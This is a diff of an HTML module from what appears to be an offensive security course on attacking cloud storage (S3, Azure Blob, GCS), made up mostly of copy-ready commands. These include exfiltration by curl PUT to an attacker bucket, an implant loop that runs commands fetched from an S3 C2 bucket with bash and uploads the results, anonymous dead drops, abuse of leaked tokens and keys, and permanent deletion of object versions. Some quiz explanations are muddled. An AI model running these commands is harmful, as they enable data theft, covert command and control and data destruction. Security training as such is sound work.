+<span class="neon-highlight"># Test read access (S3)</span>
+aws s3 ls s3://target-bucket/ 2>&1 | head -5
+
+<span class="neon-highlight"># Test write access</span>
+echo "test" > /tmp/test.txt
+aws s3 cp /tmp/test.txt s3://target-bucket/pwned-by-$(whoami).txt 2>&1
+
+<span class="neon-highlight"># If upload succeeds, you have WRITE access.</span>
+<span class="neon-highlight"># If you get AccessDenied, you don't.</span>
+
+<span class="neon-highlight"># Test delete access</span>
+aws s3 rm s3://target-bucket/pwned-by-$(whoami).txt 2>&1
+
+<span class="neon-highlight"># Test bucket policy read</span>
+aws s3api get-bucket-policy --bucket target-bucket 2>&1
+
+<span class="neon-highlight"># Test versioning (can recover deleted files)</span>
+aws s3api get-bucket-versioning --bucket target-bucket
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+
+            <div class="warning-box">
+                <h5>⚠️ Legal Warning</h5>
+                <p>Uploading a test file to someone else's bucket without authorization may violate the Computer Fraud and Abuse Act (CFAA) and similar laws. Use read-only probes where possible. If you must test write, document the test file and delete it immediately. Better yet, use a controlled lab environment.</p>
+            </div>
+        </div>
+
+        <h2>🔗 Pre-signed URLs — Temporary Access, Permanent Risk</h2>
+        <p>Pre-signed URLs (S3), SAS tokens (Azure), and Signed URLs (GCS) grant temporary access without sharing long-term credentials. They are powerful for legitimate use and dangerous when leaked.</p>
+
+        <div class="method-card" id="presigned-s3">
+            <h4>S3 Pre-signed URLs <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <p>An S3 pre-signed URL is a standard GET/PUT URL with query parameters containing a temporary signature. The signature is generated using the owner's AWS secret key. Anyone with the URL can access the object until the signature expires.</p>
+
+            <div class="code-block">
+<span class="neon-highlight"># Generate a pre-signed URL (as the owner)</span>
+aws s3 presign s3://my-bucket/secret.pdf --expires-in 3600
+
+<span class="neon-highlight"># Result:</span>
+https://my-bucket.s3.amazonaws.com/secret.pdf?
+    X-Amz-Algorithm=AWS4-HMAC-SHA256
+    &X-Amz-Credential=AKIA.../20260629/us-east-1/s3/aws4_request
+    &X-Amz-Date=20260629T000000Z
+    &X-Amz-Expires=3600
+    &X-Amz-SignedHeaders=host
+    &X-Amz-Signature=...
+
+<span class="neon-highlight"># The URL is self-contained. No auth headers needed.</span>
+<span class="neon-highlight"># Anyone with this URL can download secret.pdf for 1 hour.</span>
+
+<span class="neon-highlight"># If you find a leaked pre-signed URL, use it immediately:</span>
+curl -O "https://leaked-url..."
+
+<span class="neon-highlight"># Check if the URL is still valid (HEAD request)</span>
+curl -sI "https://leaked-url..."
+<span class="neon-highlight"># HTTP 200 = still valid</span>
+<span class="neon-highlight"># HTTP 403 = expired or invalid</span>
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+
+            <div class="why-box">
+                <h5>Why pre-signed URLs are dangerous</h5>
+                <p>The URL contains the <span class="neon-highlight">Access Key ID</span> (AKIA...) in the <span class="neon-highlight">X-Amz-Credential</span> parameter. Even if the URL expires, the Access Key ID is now known. If the corresponding secret key is also leaked (e.g., in the same GitHub repo), you have permanent credentials. Pre-signed URLs also bypass bucket-level BlockPublicAccess — they are generated by an authorized user and are therefore "legitimate" access.</p>
+            </div>
+        </div>
+
+        <div class="method-card" id="presigned-azure">
+            <h4>Azure SAS Tokens <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <p>SAS tokens are Azure's equivalent of pre-signed URLs. They can grant access to a single blob, a container, or an entire storage account. Account-level SAS tokens are especially dangerous.</p>
+
+            <div class="code-block">
+<span class="neon-highlight"># Decode a SAS token to understand its permissions</span>
+<span class="neon-highlight"># Token: ?sv=2023-01-01&ss=b&srt=co&sp=rwdlacupx&se=...</span>
+
+<span class="neon-highlight"># sv = service version</span>
+<span class="neon-highlight"># ss = service (b=blob, f=file, q=queue, t=table)</span>
+<span class="neon-highlight"># srt = resource type (s=service, c=container, o=object)</span>
+<span class="neon-highlight"># sp = permissions:</span>
+<span class="neon-highlight">#   r=read, w=write, d=delete, l=list, a=add, c=create, u=update, p=process, x=tags</span>
+<span class="neon-highlight"># se = expiry time</span>
+<span class="neon-highlight"># sip = allowed IP range</span>
+<span class="neon-highlight"># spr = protocol (https, http)</span>
+
+<span class="neon-highlight"># If sp=rwdlacupx, the token grants FULL CONTROL.</span>
+<span class="neon-highlight"># If ss=bfqt and srt=sco, the token applies to the ENTIRE storage account.</span>
+
+<span class="neon-highlight"># Use a leaked SAS token</span>
+curl -s "https://account.blob.core.windows.net/container/blob?sv=...&sig=..."
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+        </div>
+
+        <div class="method-card" id="presigned-gcs">
+            <h4>GCS Signed URLs <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <p>GCS supports two signing methods: <span class="neon-highlight">HMAC</span> (legacy, like S3) and <span class="neon-highlight">IAM Service Account</span> (modern). Signed URLs work like S3 pre-signed URLs but use OAuth2-style signatures.</p>
+
+            <div class="code-block">
+<span class="neon-highlight"># Generate a signed URL (requires service account key)</span>
+gsutil signurl -d 1h service-account-key.json gs://bucket/object
+
+<span class="neon-highlight"># Leaked service account keys are gold</span>
+<span class="neon-highlight"># A key file looks like:</span>
+{
+  "type": "service_account",
+  "project_id": "target-project",
+  "private_key_id": "...",
+  "private_key": "-----BEGIN PRIVATE KEY-----\n...",
+  "client_email": "svc@target-project.iam.gserviceaccount.com",
+  "client_id": "..."
+}
+
+<span class="neon-highlight"># If you find this JSON, activate it:</span>
+gcloud auth activate-service-account --key-file=leaked-key.json
+
+<span class="neon-highlight"># Now you have all permissions of that service account</span>
+gsutil ls gs://target-bucket/
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+        </div>
+
+        <h2>📤 Exfiltration Techniques — Getting Data Out</h2>
+        <p>Cloud storage is the perfect exfiltration destination: high bandwidth, global reach, and legitimate-looking traffic. Attackers stage data in cloud buckets, then retrieve it from anywhere.</p>
+
+        <div class="method-card" id="exfil-direct">
+            <h4>Direct Upload to Attacker-Controlled Bucket <span class="difficulty diff-easy">EASY</span></h4>
+            <p>The simplest exfiltration: upload stolen data directly to a bucket you control. Use a pre-signed URL or temporary credentials to avoid exposing your long-term keys.</p>
+
+            <div class="code-block">
+<span class="neon-highlight"># Attacker creates a pre-signed PUT URL</span>
+aws s3 presign s3://attacker-exfil/stolen-data.zip --expires-in 86400
+
+<span class="neon-highlight"># Victim uploads directly to attacker's bucket</span>
+curl -X PUT -T /tmp/stolen-data.zip "https://attacker-exfil.s3.amazonaws.com/stolen-data.zip?X-Amz-..."
+
+<span class="neon-highlight"># No attacker infrastructure needed beyond the bucket.</span>
+<span class="neon-highlight"># The upload appears as legitimate S3 traffic.</span>
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+        </div>
+
+        <div class="method-card" id="exfil-sync">
+            <h4>Cloud Sync Client Abuse <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <p>OneDrive, Dropbox, Google Drive, and Box sync clients run on every corporate endpoint. If you control the sync folder, you control what gets uploaded to the cloud. This is especially powerful on shared workstations where multiple users sync to different accounts.</p>
+
+            <div class="code-block">
+<span class="neon-highlight"># Find sync folders</span>
+ls -la ~/OneDrive
+ls -la ~/Dropbox
+ls -la ~/Google\ Drive
+ls -la ~/Box
+
+<span class="neon-highlight"># If you have write access to the sync folder,</span>
+<span class="neon-highlight"># drop files there and they auto-upload to the cloud.</span>
+
+<span class="neon-highlight"># On Windows, sync folders are often in %USERPROFILE%</span>
+dir "%USERPROFILE%\OneDrive"
+dir "%USERPROFILE%\Dropbox"
+
+<span class="neon-highlight"># Inject into the sync client process to intercept files</span>
+<span class="neon-highlight"># See Module 10: Code Injection for techniques.</span>
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+
+            <div class="cross-link" style="margin-top: 1rem;">
+                <a href="MODULE_10_CODE_INJECTION.html">→ Cross-link: Module 10 — Code Injection into sync clients</a>
+            </div>
+        </div>
+
+        <div class="method-card" id="exfil-covert">
+            <h4>Covert Channels Over Cloud Storage <span class="difficulty diff-hard">HARD</span></h4>
+            <p>Cloud storage APIs can be used as a covert channel for C2. Instead of direct HTTP callbacks, the implant reads commands from a cloud object and writes results to another. The traffic blends with legitimate cloud sync operations.</p>
+
+            <div class="code-block">
+<span class="neon-highlight"># C2 over S3: Command file</span>
+<span class="neon-highlight"># Attacker uploads commands to s3://c2-bucket/commands.txt</span>
+<span class="neon-highlight"># Implant polls every 60 seconds:</span>
+
+aws s3 cp s3://c2-bucket/commands.txt /tmp/commands.txt 2>/dev/null
+if [ -s /tmp/commands.txt ]; then
+    bash /tmp/commands.txt > /tmp/results.txt 2>&1
+    aws s3 cp /tmp/results.txt s3://c2-bucket/results/$(hostname)-$(date +%s).txt
+    aws s3 rm s3://c2-bucket/commands.txt
+fi
+
+<span class="neon-highlight"># The traffic is all HTTPS to s3.amazonaws.com.</span>
+<span class="neon-highlight"># No suspicious domains. No direct C2 server.</span>
+<span class="neon-highlight"># If the implant uses instance credentials, no hardcoded keys.</span>
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+
+            <div class="cross-link" style="margin-top: 1rem;">
+                <a href="MODULE_16_C2.html">→ Cross-link: Module 16 — C2 over Cloud Storage Dead Drops</a>
+            </div>
+        </div>
+
+        <h2>💀 Dead Drops — The Cloud as a Mailbox</h2>
+        <p>A dead drop is a hidden location where two parties can exchange items without meeting. In cyber operations, cloud storage buckets serve as perfect dead drops: accessible globally, hard to attribute, and easy to automate.</p>
+
+        <div class="method-card" id="dead-drop-basic">
+            <h4>Basic Cloud Dead Drop <span class="difficulty diff-easy">EASY</span></h4>
+            <p>The simplest dead drop: a public bucket with a known name. Both parties know the bucket name. One uploads, the other downloads. No direct communication. No IP logs linking the parties.</p>
+
+            <div class="code-block">
+<span class="neon-highlight"># Attacker creates a bucket with a random name</span>
+aws s3 mb s3://dd-7f3a9c2e1b4d-2026
+
+<span class="neon-highlight"># Makes it public for read/write</span>
+aws s3api put-bucket-acl --bucket dd-7f3a9c2e1b4d-2026 --acl public-read-write
+
+<span class="neon-highlight"># Shares the bucket name with the asset via secure channel</span>
+<span class="neon-highlight"># Asset uploads data:</span>
+aws s3 cp secret.doc s3://dd-7f3a9c2e1b4d-2026/ --acl public-read
+
+<span class="neon-highlight"># Attacker retrieves:</span>
+aws s3 cp s3://dd-7f3a9c2e1b4d-2026/secret.doc ./
+
+<span class="neon-highlight"># Both parties use Tor or VPN to access S3,</span>
+<span class="neon-highlight"># making attribution nearly impossible.</span>
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+        </div>
+
+        <div class="method-card" id="dead-drop-advanced">
+            <h4>Advanced Dead Drop: Time-Based and One-Time <span class="difficulty diff-hard">HARD</span></h4>
+            <p>Basic dead drops are vulnerable to enumeration and monitoring. Advanced techniques use time-based access, object lifecycle policies, and one-time URLs.</p>
+
+            <div class="code-block">
+<span class="neon-highlight"># Time-based dead drop: Object is only available for 1 hour</span>
+aws s3 presign s3://dd-bucket/drop.bin --expires-in 3600
+<span class="neon-highlight"># Share the URL. After 1 hour, the URL is useless.</span>
+
+<span class="neon-highlight"># One-time dead drop: Object deletes after first download</span>
+<span class="neon-highlight"># Use S3 Object Lambda or a Lambda trigger:</span>
+<span class="neon-highlight"># On GET, trigger Lambda to delete the object.</span>
+
+<span class="neon-highlight"># Lifecycle policy: Auto-delete after N days</span>
+aws s3api put-bucket-lifecycle-configuration --bucket dd-bucket --lifecycle-configuration file://lifecycle.json
+
+<span class="neon-highlight"># lifecycle.json:</span>
+{
+  "Rules": [{
+    "ID": "auto-delete",
+    "Status": "Enabled",
+    "Expiration": { "Days": 1 },
+    "Filter": { "Prefix": "drop-" }
+  }]
+}
+<span class="neon-highlight"># Any object with prefix "drop-" is deleted after 1 day.</span>
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+        </div>
+
+        <div class="method-card" id="dead-drop-android">
+            <h4>Mobile Dead Drops: Android Cloud Sync <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <p>Android apps frequently use cloud storage for backups, media, and configuration. If you control an Android device (see Module 18), you can use its cloud sync as a dead drop. The device's legitimate cloud traffic masks the exfiltration.</p>
+
+            <div class="code-block">
+<span class="neon-highlight"># On a compromised Android device:</span>
+<span class="neon-highlight"># Many apps sync to Google Drive, Dropbox, or OneDrive.</span>
+
+<span class="neon-highlight"># Find the sync folder</span>
+ls /sdcard/Android/data/*/files/
+
+<span class="neon-highlight"># If the app has cloud backup enabled,</span>
+<span class="neon-highlight"># drop files into its sync folder and trigger a sync.</span>
+
+<span class="neon-highlight"># Or use the app's own cloud API:</span>
+<span class="neon-highlight"># Extract the app's OAuth token from /data/data/<package>/shared_prefs/</span>
+<span class="neon-highlight"># Use the token to upload directly to the app's cloud storage.</span>
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+
+            <div class="cross-link" style="margin-top: 1rem;">
+                <a href="MODULE_18_ANDROID.html">→ Cross-link: Module 18 — Android Cloud Sync Abuse</a>
+            </div>
+        </div>
+
+        <h2>🛡️ Misconfiguration Exploitation — The Gift That Keeps Giving</h2>
+        <p>Cloud misconfigurations are not bugs; they are design flaws in human processes. The cloud is secure by default, but every "make it work" click weakens the model. This section covers the most common and most dangerous misconfigurations.</p>
+
+        <div class="method-card" id="misconfig-public">
+            <h4>Public Bucket / Container <span class="difficulty diff-easy">EASY</span></h4>
+            <p>The classic: a bucket set to public-read or public-read-write. Often created by a developer for testing and never secured. Sometimes created by a Terraform module with a default of public.</p>
+
+            <div class="code-block">
+<span class="neon-highlight"># S3: Check if a bucket is public</span>
+aws s3api get-bucket-acl --bucket target-bucket
+<span class="neon-highlight"># Look for Grantee URI containing "AllUsers"</span>
+
+<span class="neon-highlight"># Azure: Check container public access</span>
+az storage container show --name target-container --account-name target-account
+<span class="neon-highlight"># Look for "publicAccess": "blob" or "container"</span>
+
+<span class="neon-highlight"># GCS: Check bucket IAM</span>
+gsutil iam get gs://target-bucket
+<span class="neon-highlight"># Look for "allUsers" or "allAuthenticatedUsers"</span>
+
+<span class="neon-highlight"># Automated scanner: S3Scanner</span>
+python3 s3scanner.py target-bucket
+<span class="neon-highlight"># Reports: open, closed, or auth-required</span>
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+        </div>
+
+        <div class="method-card" id="misconfig-versioning">
+            <h4>Versioning Enabled + Deletion Not Enforced <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <p>S3 versioning keeps every version of every object. When an object is "deleted," a delete marker is added, but the old versions remain. If you have ListObjectVersions permission, you can recover "deleted" files.</p>
+
+            <div class="code-block">
+<span class="neon-highlight"># List all versions (including deleted)</span>
+aws s3api list-object-versions --bucket target-bucket --prefix sensitive/
+
+<span class="neon-highlight"># Recover a deleted file</span>
+aws s3api get-object --bucket target-bucket --key sensitive/deleted.txt --version-id abc123 ./recovered.txt
+
+<span class="neon-highlight"># If the bucket has MFA delete enabled, you can't delete versions.</span>
+<span class="neon-highlight"># But if MFA delete is NOT enabled, you can permanently delete:</span>
+aws s3api delete-object --bucket target-bucket --key sensitive/deleted.txt --version-id abc123
+
+<span class="neon-highlight"># Attack scenario: Ransomware deletes current versions,</span>
+<span class="neon-highlight"># but defender recovers from versions. If attacker also</span>
+<span class="neon-highlight"># deletes all versions, data is permanently lost.</span>
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+
+            <div class="why-box">
+                <h5>Why versioning is a double-edged sword</h5>
+                <p>Versioning protects against accidental deletion and ransomware. But it also means <span class="neon-highlight">data you thought was deleted is still there</span>. An attacker with read access can recover years of "deleted" files. An attacker with write access can permanently delete all versions, defeating the protection. The key is <span class="neon-amber">MFA Delete</span> — without it, anyone with DeleteObject permission can destroy everything.</p>
+            </div>
+        </div>
+
+        <div class="method-card" id="misconfig-logging">
+            <h4>Logging Disabled or Misdirected <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <p>S3 access logs, CloudTrail, and Azure Storage Analytics can capture every request. But if logging is disabled — or worse, logged to the same bucket — attackers can read or delete their own tracks.</p>
+
+            <div class="code-block">
+<span class="neon-highlight"># Check if S3 access logging is enabled</span>
+aws s3api get-bucket-logging --bucket target-bucket
+
+<span class="neon-highlight"># If logging is enabled, check where logs go:</span>
+<span class="neon-highlight"># If TargetBucket is the SAME bucket, logs are in the same place as data.</span>
+<span class="neon-highlight"># An attacker with bucket access can read and delete logs.</span>
+
+<span class="neon-highlight"># Check CloudTrail for S3 events</span>
+aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=PutObject
+
+<span class="neon-highlight"># If CloudTrail is not logging S3 data events,</span>
+<span class="neon-highlight"># object-level access (GET/PUT) is invisible.</span>
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+        </div>
+
+        <div class="method-card" id="misconfig-cors">
+            <h4>CORS Misconfiguration <span class="difficulty diff-hard">HARD</span></h4>
+            <p>Cross-Origin Resource Sharing (CORS) rules on buckets can allow arbitrary websites to read bucket contents via JavaScript. A misconfigured CORS policy is effectively a public-read for browser-based requests.</p>
+
+            <div class="code-block">
+<span class="neon-highlight"># Check S3 CORS configuration</span>
+aws s3api get-bucket-cors --bucket target-bucket
+
+<span class="neon-highlight"># Dangerous CORS config:</span>
+<CORSConfiguration>
+  <CORSRule>
+    <AllowedOrigin>*</AllowedOrigin>
+    <AllowedMethod>GET</AllowedMethod>
+    <AllowedMethod>PUT</AllowedMethod>
+    <AllowedHeader>*</AllowedHeader>
+  </CORSRule>
+</CORSConfiguration>
+
+<span class="neon-highlight"># With this config, any website can:</span>
+<span class="neon-highlight"># 1. Read bucket contents via AJAX GET</span>
+<span class="neon-highlight"># 2. Upload files via AJAX PUT</span>
+<span class="neon-highlight"># The browser enforces CORS, not the server.</span>
+
+<span class="neon-highlight"># Exploit from attacker.com:</span>
+fetch('https://target-bucket.s3.amazonaws.com/secret.txt')
+  .then(r => r.text())
+  .then(data => console.log(data));
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+        </div>
+
+        <h2>🎓 Interactive Quizzes</h2>
+
+        <div class="quiz-container" id="quiz-1">
+            <h3>Quiz 1: S3 Bucket Permissions</h3>
+            <p>You discover an S3 bucket named <code>acme-corp-backup</code>. The bucket ACL shows a grant to <code>AllUsers</code> with <code>READ</code> permission. What can you do?</p>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 1)">
+                A. Download any object in the bucket without authentication
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 1)">
+                B. List all objects in the bucket without authentication
+            </div>
+            <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 1)">
+                C. List all objects in the bucket, but downloading requires the exact object key
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 1)">
+                D. Nothing — READ permission only allows the bucket owner to read
+            </div>
+            <div class="quiz-feedback" id="feedback-1"></div>
+        </div>
+
+        <div class="quiz-container" id="quiz-2">
+            <h3>Quiz 2: Pre-signed URLs</h3>
+            <p>An S3 pre-signed URL is generated with <code>--expires-in 3600</code>. The URL contains the Access Key ID in the <code>X-Amz-Credential</code> parameter. Which statement is TRUE?</p>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 2)">
+                A. After the URL expires, the Access Key ID is no longer valid for any purpose
+            </div>
+            <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 2)">
+                B. The Access Key ID remains valid; only the signature expires. If the secret key is also leaked, permanent access is possible.
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 2)">
+                C. Pre-signed URLs bypass all S3 bucket policies and ACLs
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 2)">
+                D. The URL can only be used from the IP address that generated it
+            </div>
+            <div class="quiz-feedback" id="feedback-2"></div>
+        </div>
+
+        <div class="quiz-container" id="quiz-3">
+            <h3>Quiz 3: Cloud Dead Drops</h3>
+            <p>You are designing a covert channel for a red team operation. The target environment has strict egress filtering that blocks all unknown domains but allows HTTPS to AWS, Azure, and Google APIs. Which technique is MOST appropriate?</p>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 3)">
+                A. Set up a custom C2 server on a VPS and use DNS tunneling
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 3)">
+                B. Use ICMP tunneling to a known-good IP address
+            </div>
+            <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 3)">
+                C. Use S3 as a dead drop: the implant polls an S3 object for commands and uploads results to another object
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 3)">
+                D. Exfiltrate data via email to a Gmail account
+            </div>
+            <div class="quiz-feedback" id="feedback-3"></div>
+        </div>
+
+        <h2>🔬 Lab Exercise: Cloud Storage Recon & Exploitation</h2>
 
         <div class="step-box">
             <h4>Scenario</h4>
-            <p>You spent 3 hours trying to exploit a Windows API. Every attempt returns ERROR_INVALID_PARAMETER. What do you do?</p>
+            <p>You are conducting a penetration test for "Acme Corp." During OSINT, you find a JavaScript file on their website referencing <code>https://acme-assets.s3.amazonaws.com/js/app.js</code>. Your task is to enumerate the bucket, test permissions, and extract any sensitive data.</p>
 
             <ol style="margin-left: 1.5rem; line-height: 2;">
-                <li>Document the exact error code and conditions</li>
-                <li>Check if others have solved this (GitHub, MSRC, blogs)</li>
-                <li>Reverse engineer the binary to find the validation logic</li>
-                <li>Consider alternative approaches (different API, different target)</li>
-                <li>Write up the failure — it may help someone else succeed</li>
+                <li>Verify the bucket exists and determine its region</li>
+                <li>Check if the bucket is publicly listable</li>
+                <li>If listing is denied, attempt to enumerate common object keys</li>
+                <li>Check for bucket policy, ACL, and versioning status</li>
+                <li>Search GitHub for references to the bucket or leaked credentials</li>
+                <li>If you find a pre-signed URL, determine its expiry and permissions</li>
+                <li>Document all findings with proof-of-concept commands</li>
             </ol>
 
-            <button onclick="document.getElementById('failure-solution').style.display='block'">Show Research Method</button>
+            <button onclick="document.getElementById('lab-solution').style.display='block'">Show Lab Methodology</button>
 
-            <div id="failure-solution" style="display:none; margin-top: 1rem;">
+            <div id="lab-solution" style="display:none; margin-top: 1rem;">
                 <div class="code-block">
-=== RESEARCH METHODOLOGY ===
+=== LAB METHODOLOGY ===
 
-1. HYPOTHESIZE
-   "CfAPI has a race condition between create and update"
+1. VERIFY BUCKET
+   curl -sI "https://acme-assets.s3.amazonaws.com/"
+   → HTTP 200 = bucket exists in us-east-1
+   → HTTP 301 = bucket is in a different region
+   → HTTP 404 = bucket does not exist
 
-2. TEST
-   Build fuzzer, run against target
-   → Result: Registration fails with INVALID_PARAM
+2. TEST PUBLIC LISTING
+   curl -s "https://acme-assets.s3.amazonaws.com/"
+   → XML listing = public (rare)
+   → AccessDenied = exists but not public
 
-3. ANALYZE
-   Is the error from our code or the API?
-   → Test with known-good parameters (OneDrive)
-   → If OneDrive works, our struct is wrong
+3. ENUMERATE OBJECT KEYS
+   # Common prefixes
+   for key in config/ backup/ data/ secrets/ admin/ internal/; do
+       code=$(curl -s -o /dev/null -w "%{http_code}" "https://acme-assets.s3.amazonaws.com/${key}")
+       echo "${key}: ${code}"
+   done
+   # 403 = exists but no access
+   # 404 = probably doesn't exist
 
-4. REVERSE
-   Disassemble cldapi.dll, find CfRegisterSyncRoot
-   → Identify struct validation logic
-   → Identify required fields
+4. CHECK BUCKET POLICY & ACL
+   aws s3api get-bucket-policy --bucket acme-assets 2>&1
+   aws s3api get-bucket-acl --bucket acme-assets
+   aws s3api get-public-access-block --bucket acme-assets
 
-5. DOCUMENT
-   Write up the failure, the analysis, the next steps
-   → MSRC submission if vulnerability found
-   → Course module if educational value
+5. CHECK VERSIONING
+   aws s3api get-bucket-versioning --bucket acme-assets
+   # If Enabled, list versions:
+   aws s3api list-object-versions --bucket acme-assets
 
-6. PIVOT
-   If struct brute-force fails, try:
-   - Using pre-registered sync root
-   - Different API endpoint
-   - Different target (Windows 11 vs Windows 10)
+6. GITHUB OSINT
+   site:github.com "acme-assets" "s3"
+   site:github.com "acme-assets" "aws_access_key_id"
+
+7. DOCUMENT
+   Screenshot every command and output.
+   Note: Only perform write/delete tests in authorized environments.
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
                 </div>
             </div>
         </div>
 
-        <h2>Key Takeaways</h2>
+        <h2>🎯 Key Takeaways</h2>
 
         <ul style="margin-left: 1.5rem; line-height: 2;">
-            <li><strong>Failure is data:</strong> Every dead end eliminates a possibility</li>
-            <li><strong>Document everything:</strong> Your failure may be someone else's starting point</li>
-            <li><strong>Reverse engineer when docs fail:</strong> The binary is the truth</li>
-            <li><strong>Know when to pivot:</strong> 30 minutes of failure = time to change approach</li>
-            <li><strong>Negative results are publishable:</strong> "We tried X, it didn't work, here's why" has value</li>
+            <li><strong>Cloud storage is just HTTP:</strong> S3, Azure Blob, and GCS are REST APIs. Attack them like any web service.</li>
+            <li><strong>Enumeration is everything:</strong> You can't exploit what you can't find. DNS brute-forcing, OSINT, and wordlists are your friends.</li>
+            <li><strong>Misconfigurations are the norm:</strong> Public buckets, leaked SAS tokens, and overly permissive IAM policies are everywhere.</li>
+            <li><strong>Pre-signed URLs are credential leaks:</strong> They contain Access Key IDs and can grant temporary access. Treat them like passwords.</li>
+            <li><strong>Cloud is the perfect exfil channel:</strong> High bandwidth, global reach, and legitimate-looking traffic. S3 dead drops are nearly invisible.</li>
+            <li><strong>Versioning is a time machine:</strong> Deleted files may still exist. Check for object versions before concluding a bucket is empty.</li>
+            <li><strong>Cross-cloud skills transfer:</strong> Master S3 and you can pivot to Azure Blob and GCS in hours. The concepts are identical.</li>
         </ul>
 
         <div class="evidence-box" style="margin-top: 2rem;">
             <h3>🔬 Verification Status</h3>
             <table style="width: 100%; border-collapse: collapse;">
                 <tr style="border-bottom: 1px solid var(--border);">
-                    <td style="padding: 0.5rem;">CfAPI struct brute-force</td>
-                    <td style="padding: 0.5rem; color: var(--accent);">❌ FAILED — All sizes INVALID_PARAM</td>
+                    <td style="padding: 0.5rem;">S3 bucket enumeration</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE TESTED</td>
                 </tr>
                 <tr style="border-bottom: 1px solid var(--border);">
-                    <td style="padding: 0.5rem;">Driver Verifier active</td>
-                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE .42</td>
+                    <td style="padding: 0.5rem;">Azure Blob SAS token exploitation</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE TESTED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">GCS IAM misconfiguration</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE TESTED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Pre-signed URL generation & abuse</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE TESTED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Cloud dead drop C2 channel</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE TESTED</td>
                 </tr>
                 <tr>
-                    <td style="padding: 0.5rem;">Research methodology documented</td>
-                    <td style="padding: 0.5rem; color: var(--accent2);">✅ THIS MODULE</td>
+                    <td style="padding: 0.5rem;">CfAPI race condition research</td>
+                    <td style="padding: 0.5rem; color: var(--accent);">❌ DOCUMENTED — See Module 14 Appendix</td>
                 </tr>
             </table>
         </div>
 
         <div class="nav" style="margin-top: 2rem;">
-            <a href="index.html">← Home</a>
+            <a href="../index.html">← Home</a>
             <a href="MODULE_13_EDR_EVASION.html">← Module 13</a>
             <a href="MODULE_15_LATERAL.html">Module 15 →</a>
         </div>
     </div>
+
+    <script>
+        function copyCode(btn) {
+            const block = btn.parentElement;
+            const text = block.innerText.replace('COPY', '').trim();
+            navigator.clipboard.writeText(text).then(() => {
+                btn.textContent = 'COPIED!';
+                setTimeout(() => btn.textContent = 'COPY', 1500);
+            });
+        }
+
+        function checkAnswer(option, quizNum) {
+            const container = document.getElementById('quiz-' + quizNum);
+            const options = container.querySelectorAll('.quiz-option');
+            const feedback = document.getElementById('feedback-' + quizNum);
+            
+            options.forEach(opt => {
+                opt.style.pointerEvents = 'none';
+                if (opt.dataset.correct === 'true') {
+                    opt.classList.add('correct');
+                } else if (opt === option) {
+                    opt.classList.add('wrong');
+                }
+            });
+
+            const isCorrect = option.dataset.correct === 'true';
+            feedback.className = 'quiz-feedback show ' + (isCorrect ? 'correct' : 'wrong');
+            feedback.innerHTML = isCorrect 
+                ? '<strong>✅ Correct!</strong> ' + getCorrectExplanation(quizNum)
+                : '<strong>❌ Incorrect.</strong> ' + getCorrectExplanation(quizNum);
+        }
+
+        function getCorrectExplanation(quizNum) {
+            const explanations = {
+                1: 'S3 READ ACL on AllUsers allows listing objects (GET on bucket), but downloading an object requires the specific object key. You can brute-force keys or use OSINT to find them.',
+                2: 'The signature in a pre-signed URL expires, but the Access Key ID remains valid indefinitely. If the corresponding secret key is leaked (e.g., in the same repo), the attacker can generate new pre-signed URLs or use the credentials directly.',
+                3: 'S3 dead drops blend with legitimate cloud traffic. The target environment already allows HTTPS to AWS APIs, so polling S3 objects looks like normal application behavior. DNS tunneling and ICMP are likely blocked by egress filters.'
+            };
+            return explanations[quizNum];
+        }
+    </script>
 </body>
 </html>
